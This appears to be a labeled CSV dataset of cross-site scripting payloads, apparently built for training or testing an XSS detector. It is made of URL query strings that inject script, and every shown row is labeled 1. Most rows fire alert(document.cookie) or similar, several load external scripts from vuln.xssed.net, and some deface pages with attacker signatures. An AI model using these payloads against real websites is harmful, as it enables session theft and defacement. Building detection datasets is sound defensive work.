Payload,Label
i=71&ex1=''%3E%3C/script%3E%3Cscript%3Ealert(document.cookie)<br/>%3C/script%3E''%3E%3Ch1%3Edjsedat%20Narcoticxs%3C/h1%3E,1
STARTID=CLIP_5644&adgroup=KRMGEN&URL=%68%74%74%70%3A%2F%<br/>2F%77%77%77%2E%6C%69%6E%75%78%2E%6F%72%67,1
id=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/thir<br/>dparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
sid=''%3E%3C/script%3E%3Cscript%3Ealert<br/>(document.cookie)%3C/script%3E''%3E%3Ch1%3Edjsedat%20Narcoticxs%3C/h1%3E&f=1&ff=y&rd3=1,1
UserID=''></script><script>alert(document.cookie)</script>''><<br/>h1>djsedat%20Narcoticxs</h1>,1
"CtgID=""><script>alert(""MaXWeL"")</script>",1
idLang=fr&idLieu=%22%3E'%3E%3CSCRIPT%20SRC=<br/>http://vuln.xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
"rubrique=%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCh<br/>arCode(83,69,67,85,82,73,84,89,32,83,85,88))%3C/SCRIPT%3E%3CBODY%20ONLOAD=alert('XSS')%3E",1
view=referrer&time_frame=12&year=2006&mo<br/>nth=1&day=22&hour=14&session_id=google&limitNumber=''></script><script>alert(document.cookie)</scrip<br/>t>''><h1>djsedat%20Narcoticxs</h1>,1
"state=""><script>alert(""MaXWeL"")</script>",1
keywords=%3E%3C/script%3E%3Cscript%3Ealert(d<br/>ocument.cookie)%3C/script%3E%3E%3Ch1%3Edjsedat%20Narcoticxs%3C/h1%3E&page_nm=/websearch_results-Righ<br/>t.htm,1
i=169&ex1=yes&ex2=yes&ex3=''></script><script>alert(document<br/>.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,1
pid=''><script>alert('Narcoticxs')</script>,1
q=%5C%22juliette%20rossant%5C%22&page=2&ss=''></script><script>ale<br/>rt(document.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,1
i=3282&ex1=''></script><script>alert(document.cookie)</script>''><br/><h1>djsedat%20Narcoticxs</h1>,1
PID=61&PHPSESSID=1b7a48d722947899a13d6bc0f963cb09&ye<br/>ar=2004&month=10&mday=''></script><script>alert(document.cookie)</script>''><h1>djsedat%20Narcoticxs<br/></h1>,1
q=''><script>alert('Narcoticxs')</script>,1
year=2005&month=2&day=''></script><script>a<br/>lert(document.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,1
op=behandlinger&id=96&sub=407&text=''></script><script>alert(docume<br/>nt.cookie)</script>,1
msg_id=''></script><script>alert(document.cookie)</script><br/>''><h1>djsedat%20Narcoticxs</h1>,1
l=''><script>alert('Narc<br/>oticxs')</script>''><h1>djsedat</h1>,1
demo=demo&lang=de&state=us&ref=''></<br/>script><script>alert(document.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,1
Site=Stats&RangeYear=2006&RangeMonth=12&ViewMode=''></scrip<br/>t><script>alert(document.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,1
"i=""><script>alert(""MaXWeL"")</script>",1
id=''></script><script>alert(document.cookie)</script>,1
dt=''></script><script>alert(document.cooki<br/>e)</script>''><h1>djsedat%20Narcoticxs</h1>,1
l=''></script><script>alert(<br/>document.cookie)</script>,1
inc=busca&argumento=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xsse<br/>d.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
"bandeau=/energie/politiqu/be_polit.htm""><<br/>frame name=droite src=http://vuln.xssed.net/thirdparty/scripts/ckers.org.html>",1
acao=busca&pesquisa=%22%3E%27%3E%3CSCRIPT+SRC%3Dhttp%3<br/>A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E&Submit=OK,1
"commun=%22;alert(String.fromCharCode(<br/>83,69,67,85,82,73,84,89,32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromChar<br/>Code(83,69,67,85,82,73,84,89,32,83,85,88))%3C/SCRIPT%3E",1
"DataFlow=ShowPage.dfl&Template=%22;alert(String.fromCharCode(83,69,67,85,8<br/>2,73,84,89,32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(83,69,67<br/>,85,82,73,84,89,32,83,85,88))%3C/SCRIPT%3E",1
"mot=%22;alert(String.fromCharCode(83,69,67,8<br/>5,82,73,84,89,32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(83,69<br/>,67,85,82,73,84,89,32,83,85,88))%3C/SCRIPT%3E",1
q=''></script><script>alert(document.cookie)</script>''><h1>djs<br/>edat%20Narcoticxs</h1>,1
URL=%3C%3CSCRIPT%3Ealert(%22XSS%20|%20Hexspirit%22);//%3C%3C/SCR<br/>IPT%3E,1
lnk=http://vuln.xssed.net/thirdparty/scripts/python5.h<br/>tml,1
"secao_id=49&palavra=""><script<br/>src=http://vuln.xssed.net/thirdparty/scripts/python5.js></script>",1
op=2&cdassunto=%22%3E%3E%3CBODY%20ONLOAD=alert('XSS'<br/>)%3E,1
istenen_arsiv_yili=''><script>alert('XSS')</script>''><h1>hacked<br/>narcoticxs</h1>,1
genelarama=''><script>alert('Narcoticxs')</script>''><h1>djsedat<<br/>/h1>,1
sUrl=@vuln.xssed.net/thirdparty/scripts/python5.html,1
search=''></script><script>alert(document.cookie)</script>,1
name=''><script>alert('XSS')</script>''><h2>hackedhackedha<br/>ckednarcoticxs</h2>,1
"ps_pays=""><script>alert(""MaXWeL"")</script>",1
"env=""><script>alert(""MaXWeL"")</script>",1
"vers=""><script>alert(""MaXWeL"")</script>",1
Secao_id=5%22%3E%3Cscript%20src=http://vuln<br/>.xssed.net/thirdparty/scripts/python5.js%3E%3C/script%3E,1
1=1&monitor_nl_p=stat&idc=136&clid=3&type=''></script><script>alert(docume<br/>nt.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,1
secao=1&Idioma=Port&Mode=Especial&Page=http://ww13.itau<br/>.com.br@vuln.xssed.net/thirdparty/scripts/python5.html,1
"woher=""><script>alert(""MaXWeL"")</script>",1
"mx=""><script>alert(""MaXWeL"")</script>",1
SearchFor=%22%3E%3Cscript%3Ealert(document.cookie)<br/>%3C/script%3E,1
"Sites%5B%5D=109&NbParPage=10&<br/>Source=interne&TypeRecherche=totale&TypeDocument=&Debut=&Fin=&offset=0&MotsCles=%22;alert(String.fro<br/>mCharCode(83,69,67,85,82,73,84,89,32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(Strin<br/>g.fromCharCode(83,69,67,85,82,73,84,89,32,83,85,88))%3C/SCRIPT%3E&submit=Ok",1
"islem=ara&nerden=0&kelime=""><script>alert(document.cookie)</s<br/>cript><h1>By St@rExT</h1>",1
SearchFor=%22%3E%3Cscript%3Ealert(docume<br/>nt.cookie)%3C/script%3E,1
SearchFor=%22%3E%3Cscript%3Ealert(document.cookie)%3C/s<br/>cript%3E,1
SearchFor=%22%3E%3Cscript%3Ealert(document.cookie)%3C/sc<br/>ript%3E,1
"incele=1112""><script>alert(document.cookie)</script>",1
SearchFor=%22%3E%3Cscript%3Ealert(document.cookie<br/>)%3C/script%3E,1
searchFor=%22%3E%3Cscript%3Ealert(document.cookie)%<br/>3C/script%3E,1
"woher=""><script>alert(""MaXWeL"")</sc<br/>ript>",1
regi=<BODY%20ONLOAD=alert('XSS')>,1
PID=959&SearchFor=%22%3E%3Cscript%3Ealert(document.cookie)<br/>%3C/script%3E,1
SearchFor=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3<br/>E,1
SearchFor=%22%3E%3Cscript%3Ealert(document.cookie)%3C/scrip<br/>t%3E,1
SearchFor=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%<br/>3E,1
lupo_id=''></script><script>alert(document<br/>.cookie)</script>''><h1>djsedat%20Narcoticxs</h1>,1
a=''></script><script>alert(document.cookie)</script>''><h1>djsedat%<br/>20Narcoticxs</h1>,1
u1=http://www.cyber-unity.com&m1=%3Cscript%3Ea<br/>lert(document.cookie)%3C/script%3E&m2=%3Ch1%3ESystem%20XSSED%3C/h1%3E&m3=CybeR-Unity%20Team&m4=%3Ch1<br/>%3EHacKed%20By%20s3aL%3C/h1%3E,1
q=''></script><script>alert(document.cookie)</script>''><h1>djseda<br/>t%20Narcoticxs</h1>,1
p=dct2&catid=6&cid=''></script><script>alert(document.cookie)</scri<br/>pt>''><h1>djsedat%20Narcoticxs</h1>,1
"image_id=""><script>alert(""MaXWeL"")<br/></script>",1
searchstring=%3Cscript%3Ealert('zupper')%3C/script%3E,1
q=%3Cscript%3Ealert('zupper')%3C/script%3E,1
"image_id=""><script>alert(""M<br/>aXWeL"")</script>",1
"recherche=';alert(String.fromCharCode(83,69,67,85,<br/>82,73,84,89,32,83,85,88))//\';alert(String.fromCharCode(83,69,67,85,82,73,84,89,32,83,85,88))//%22;a<br/>lert(String.fromCharCode(83,69,67,85,82,73,84,89,32,83,85,88))//\%22;alert(String.fromCharCode(83,69<br/>,67,85,82,73,84,89,32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(<br/>83,69,67,85,82,73,84,89,32,83,85,88))%3C/SCRIPT%3E",1
qs=%3Cscript%3Ealert%28%27zupper%27%29%3C%2Fscript%3E&OK=++search++,1
sb=1&d=&search=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script<br/>%3E,1
sb=1&d=&search=%22%3E%3Cscript%3Ealert(document.cookie)%3C/sc<br/>ript%3E,1
"mnuSol=""><script>alert(""MaXWeL"")</script>",1
"TID=""><script>alert(""MaXWeL"")</script>",1
MOT=%27%3Balert%28String.fromCharCode%2883%<br/>2C69%2C67%2C85%2C82%2C73%2C84%2C89%2C32%2C83%2C85%2C88%29%29%2F%2F%5C%27%3Balert%28String.fromCharCo<br/>de%2883%2C69%2C67%2C85%2C82%2C73%2C84%2C89%2C32%2C83%2C85%2C88%29%29%2F%2F%22%3Balert%28String.fromC<br/>harCode%2883%2C69%2C67%2C85%2C82%2C73%2C84%2C89%2C32%2C83%2C85%2C88%29%29%2F%2F%5C%22%3Balert%28Stri<br/>ng.fromCharCode%2883%2C69%2C67%2C85%2C82%2C73%2C84%2C89%2C32%2C83%2C85%2C88%29%29%2F%2F--%3E%3C%2FSC<br/>RIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2883%2C69%2C67%2C85%2C82%2C73%2C84%2C89%2<br/>C32%2C83%2C85%2C88%29%29%3C%2FSCRIPT%3E%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E&x=5&y=13,1
"society=""><script>alert(""MaXWeL"")</script>",1
"A=""><script>alert(""MaXWeL"")</script>",1
sb=1&d=&search=%22%3E%3Cscript%3Ealert(document.cookie)%3C/scrip<br/>t%3E,1
"dir=""><script>alert(""MaXWeL"")</script>",1
"lang=fr&ref=%22%3E%3Cscript%3Ealert(String.fromCharC<br/>ode(83,69,67,85,82,73,84,89,32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E",1
"searchKey=""><script>alert(""MaXWeL"")</script>",1
p_secao=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/<br/>thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
sb=1&d=&search=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,1
search_type=dir&query=%3Cscript%3Ealert('zupper')%3C/script%3E,1
page=%22%3E'%3E%3CSCRIPT%20SRC=http://vu<br/>ln.xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
"rub=fi&pg=%22;alert(String.fromCharCode(83,69,67,85,82,73,84,89,<br/>32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(83,69,67,85,82,73,8<br/>4,89,32,83,85,88))%3C/SCRIPT%3E",1
"m=""><script>alert(""MaXWeL"")</script>",1
"md=""><script>alert(""MaXWeL"")</script>",1
a=0&query=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,1
"board_idx=""><script>alert(""MaXWeL"")</script>",1
"par=""><script>alert(""MaXWeL"")</script>",1
keyword=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E,1
"TTP2=""><script>alert(""MaXWeL"")</script>",1
"pageid=%22;alert(String.fromCharCode(83,69,67,8<br/>5,82,73,84,89,32,83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(83,69<br/>,67,85,82,73,84,89,32,83,85,88))%3C/SCRIPT%3E",1
"CartId=""><script>alert(""MaXWeL"")</script>",1
"path=""><script>alert(""MaXWeL"")</script<br/>>",1
"sit=""><script>alert(""MaXWeL"")</script>",1
"f1=""><script>alert(""MaXWeL"")</script>",1
"SearchField=""><script>alert(""MaXWeL"")</script>",1
"path=""><script>alert(""MaXWeL"")</scri<br/>pt>",1
"prodid=""><script>alert(""MaXWeL"")</script>",1
"fc=""><script>alert(""MaXWeL"")</script>",1
IDAERROR=&QRY=all&RNG=lequ&CTRY=trk&LANG=tu&PAGE=simpleSearch<br/>&LIP=simpleSearch&ACTION=search&STP=S&ROT=rot&REQ=20&NAM=%22%3E%3Cscript%3Ealert(document.cookie)%3C<br/>/script%3E%3Cstyle%3EBody{background-color:black;color:white;font:50px%20arial;}%3C/style%3E%3Ch1%3E<br/>BY%20ST@rEXT%3E%3Cmarquee%3EWhiteHat+Forever+BY%20St@rExT%3C%2F,1
municipio=%22%3E'%3E%3C<br/>SCRIPT%20SRC=http://vuln.xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
"catId=""><script>alert(document.cookie)</script>",1
Keywords=<script>alert(document.cookie)</script>,1
idspc=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.<br/>net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
go=News&p=dn&news_id=15%22%3E%3Cstyle%3EBody{background-color:b<br/>lack;color:white;font:50px%20arial;}%3C/style%3E%3Ch1%3EBY%20ST@rEXT%3E%3Cmarquee%3EWhiteHat+Forever<br/>+BY%20St@rExT%3C%2F%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cbody%20onload=alert(/xssed/)%3E,1
"tagId=""><script>alert(document.cookie)</script>",1
"d=""><script>alert(""MaXWeL"")</script>",1
"S=""><script>alert(""MaXWeL"")</script>",1
"dom=""><script>alert(""MaXWeL"")</script>",1
"id=""><script>alert(""MaXWeL"")</sc<br/>ript>",1
recherche=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xss<br/>ed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
"jazyk=""><script>alert(""MaXWeL"")</script>",1
"xd=""><script>alert(""MaXWeL"")</script>",1
"login=""><script>alert(""MaXWeL"")</script>",1
go=News&p=dn&news_id=4%22%3E%3Cstyle%3EBody{background-color:bla<br/>ck;color:white;font:50px%20arial;}%3C/style%3E%3Ch1%3EBY%20ST@rEXT%3E%3Cmarquee%3EWhiteHat+Forever+B<br/>Y%20St@rExT%3C%2F%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cbody%20onload=alert(/xssed/)%3E,1
wcCategory=0&wcHeadlines=%3Cstyle%3EBody{background-c<br/>olor:black;color:white;font:50px%20arial;}%3C/style%3E%3Ch1%3EBY%20ST@rEXT%3E%3Cmarquee%3EWhiteHat+F<br/>orever+BY%20St@rExT%3C%2F%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cbody%20onload=alert(/xsse<br/>d/)%3E,1
_Base=%22%3E'%3E%3CSCRIPT%20SRC=ht<br/>tp://vuln.xssed.net/thirdparty/scripts/python5.js%3E%3C/SCRIPT%3E,1
month=3&day=9&year=2007%22%3E%3Cstyle%3EBody{background-color:black;color<br/>:white;font:50px%20arial;}%3C/style%3E%3Ch1%3EBY%20ST@rEXT%3E%3Cmarquee%3EWhiteHat+Forever+BY%20St@r<br/>ExT%3C%2F%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Cbody%20onload=alert(/xssed/)%3E,1
UNme=%22%3E%3Cscript%3Ealert(%22MaXWeL%22)%3C/script%3E,1
link=%22%3E%3Cscript%3Ealert(%22MaXWeL%22)%3C/script%3E,1
"p=lastpub&i=iwdnr&n=lastpub2&m=pub&f=4""><script>alert(document.co<br/>okie)</script>",1
stype=0&wd=%22%3E%3Cscript%3Ealert(%22MaXWeL%22)<br/>%3C/script%3E,1
"cat_id=19""><h1>By St@rExT XSSED</h1><body onload=alert(/xssed/)>",1
music_name=%22%3E%3Cscript%3Ealert(%22MaXWeL%22)%3C/script%3<br/>E,1
"mid=""><script>alert(document.cookie)</script>",1
a=%22%3E%3Cscript%3Ealert(%22MaXWeL%22)%3C/script%3E,1
"program=""><script>alert(""MaXWeL"")</sc<br/>ript>",1
"activeDoc=""><script>alert(""MaXWeL"")</s<br/>cript>",1
"mut=""><script>alert(""MaXWeL"")</script>",1
"sce=""><script>alert(""MaXWeL"")</script>",1
"band_id=""><script>alert(""MaXWeL"")</script>",1
"B=""><script>alert(""MaXWeL"")</script>",1
"qrm=""><script>alert(""MaXWeL"")</script>",1
"section=""><script>alert(""MaXWeL"")</script<br/>>",1
"page_filename=""><script>alert(""MaXWeL"")</script>",1
class=communes%22%3E%3Cscript%20src=http://vuln.xssed.net/thi<br/>rdparty/scripts/ckers.org.js%3E%3C/script%3E&function=index&template=matricecommune.html&file=indexc<br/>ommune.html&nocache=1&resolution=1024,1
id_CONTEUDO=+128&codID_CAT=+17&imgCAT=tema_search.jpg<br/>&procurar=%22%3E%3Cscript+src%3Dhttp%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fckers.org.js%3E<br/>%3C%2Fscript%3E&bFIND.x=14&bFIND.y=17,1
qbesearch=%253E%3CBODY+ONLOAD%3Dalert%<br/>28%27XSSED%27%29%3E&Submit=ok,1
"T=""><script>alert(""MaXWeL"")</script>",1
langu=fr?texte=%22%3E%27%3E%3CSC<br/>RIPT+SRC%3Dhttp%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E&ouCherc<br/>her=titre&ordre_0=0&Submit=Ok,1
"dtd_id=%22;alert(String.fromCharCode(83,69,67,85,82,73,84,89,32,<br/>83,85,88))//--%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(83,69,67,85,82,73,84,8<br/>9,32,83,85,88))%3C/SCRIPT%3E",1
rempli=oui&b_nat=on&id_reg=&mot_cle=&titre=%22%3E%27%3E%3CS<br/>CRIPT+SRC%3Dhttp%3A%2F%2Fvuln.xssed.net%2Fthirdparty%2Fscripts%2Fpython5.js%3E%3C%2FSCRIPT%3E&publi=<br/>&ok=Rechercher&num_pub=&deb_mois=&deb_annee=&fin_mois=&fin_annee=&auteur=,1
recherche=%22%3E'%3E%3CSCRIPT%20SRC=http://vuln.xssed.net/thi<br/>rdparty/scripts/python5.js%3E%3C/SCRIPT%3E&soumettre=Rechercher&nombreReponseParPage=10,1
